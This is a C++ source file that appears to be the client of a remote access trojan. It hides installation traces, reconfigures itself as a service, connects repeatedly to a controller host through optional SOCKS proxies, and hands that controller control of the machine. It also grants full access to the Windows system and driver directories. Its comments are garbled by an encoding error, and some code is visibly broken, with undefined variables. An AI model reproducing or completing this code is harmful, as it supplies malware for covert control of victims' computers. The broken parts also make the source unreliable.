#include <UtilFunc/PluginInc.h>
#include <windows.h>
#include <stdlib.h>
#include <Aclapi.h>
#include <lm.h>
#include <Shlwapi.h>
#include <tchar.h>
#pragma comment(lib, "NetApi32.lib")

//////////////////////////////////////////////////////////////////////////
// �����ⲿͷ�ļ�

#include "RemoteTool.h"

//////////////////////////////////////////////////////////////////////////
// ���ÿ��ļ�

#pragma comment(lib,"Psapi")
#pragma comment(lib,"iphlpapi")
#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.FileControl.lib")
#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.CommonControl.lib")
#pragma comment(lib, DIRECTORY_LIB "Function\\Function.Internal.SystemControl.lib")

//////////////////////////////////////////////////////////////////////////
// Initializaton


CRemote::CRemote()
{
}

CRemote::~CRemote()
{
}

enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};
#define		HEART_BEAT_TIME		1000 * 60 * 3 // ����ʱ��

bool CRemote::Initialization(PVOID pData)
{
	bool bRet = false;

	//////////////////////////////////////////////////////////////////////////
	// ������Ǹ��·����
	if (pData == NULL)
		return bRet;


	// lpServiceName,��ServiceMain���غ��û����
	TCHAR	strServiceName[MAX_PATH+1];
	TCHAR	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;

	char	*lpURL = NULL;//(char *)FindConfigString(CKeyboardManager::g_hInstance, "AAAAAA");
	if (lpURL == NULL)
	{
		return -1;
	}

	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation(_T("winsta0"), FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////


	if (CKeyboardManager::g_hInstance != NULL)
	{
		//SetUnhandledExceptionFilter(bad_exception);
		//ResetSSDT();

		//_tcscpy_s(strServiceName, lpServiceName);
		_stprintf(strKillEvent, _T("Global\\SYSTEM_PLUGIN_REMOTE_%d"), GetTickCount()); // ����¼���

		hInstallMutex = CreateMutex(NULL, true, lpURL);
		ReConfigService(strServiceName);
		// ɾ����װ�ļ�
		DeleteInstallFile(lpServiceName);
	}
	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
	// ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// ��һ��
				Sleep(60);
			}
		}
#ifdef _DLL
		// ���߼��Ϊ2��, ǰ6��'A'�Ǳ�־
		if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost, 
			&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}
#else
		lpszHost = _T("192.168.3.100");
		dwPort = atoi(argv[2]);
#endif
		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// ����Ҫ�ָ�׿�棬��Ϊ����Ǹ��·���˵Ļ����·���������У��˽��ָ̻�����׿�棬���������
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);

	return bRet;
}

//////////////////////////////////////////////////////////////////////////
// Public:

void CRemote::SetAccessRights()
{
	TCHAR	szUserName[50], szGroupName[100], lpDriverDirectory[MAX_PATH], lpSysDirectory[MAX_PATH];
	DWORD	nSize = sizeof(szUserName);

	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;   
	DWORD   dwEntriesRead = 0;   
	DWORD   dwTotalEntries = 0;   
	NET_API_STATUS   nStatus;
	WCHAR wUserName[100];

	ZeroMemory(szUserName, sizeof(szUserName));
	ZeroMemory(lpDriverDirectory, sizeof(lpDriverDirectory));
	ZeroMemory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpDriverDirectory, sizeof(lpDriverDirectory));
	_tcscat_s(lpDriverDirectory, _T("\\Drivers"));
	GetUserName(szUserName, &nSize);
	// ���ó�ԱȨ��
	m_cFileControlTool.AddAccessRights(lpSysDirectory, szUserName, GENERIC_ALL);
	m_cFileControlTool.AddAccessRights(lpDriverDirectory, szUserName, GENERIC_ALL);

#ifndef UNICODE
	MultiByteToWideChar( CP_ACP, 0, szUserName, -1, wUserName, sizeof(wUserName) / sizeof(wUserName[0])); 
#else
	wcscpy_s(wUserName,szUserName);
#endif

	nStatus = NetUserGetLocalGroups(NULL,(LPCWSTR)wUserName,0,LG_INCLUDE_INDIRECT,(LPBYTE *) &pBuf,MAX_PREFERRED_LENGTH,&dwEntriesRead,&dwTotalEntries);   

	if (nStatus == NERR_Success)   
	{   
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;   

		if ((pTmpBuf = pBuf) != NULL)
		{   
			for (int i = 0; i < dwEntriesRead; i++)   
			{ 
				if (pTmpBuf == NULL)     
					break;
#ifndef UNICODE
				WideCharToMultiByte(CP_OEMCP, 0, (LPCWSTR)pTmpBuf->lgrui0_name, -1, szGroupName, sizeof(szGroupName), NULL, FALSE);
#else
				wcscpy_s(szGroupName,pTmpBuf->lgrui0_name);
#endif
				// �������Ȩ��
				m_cFileControlTool.AddAccessRights(lpSysDirectory, szGroupName, GENERIC_ALL);
				m_cFileControlTool.AddAccessRights(lpDriverDirectory, szGroupName, GENERIC_ALL);	
				pTmpBuf++;  
			}   
		}      
	}  

	if (pBuf != NULL)  
	{
		NetApiBufferFree(pBuf); 
	}
}
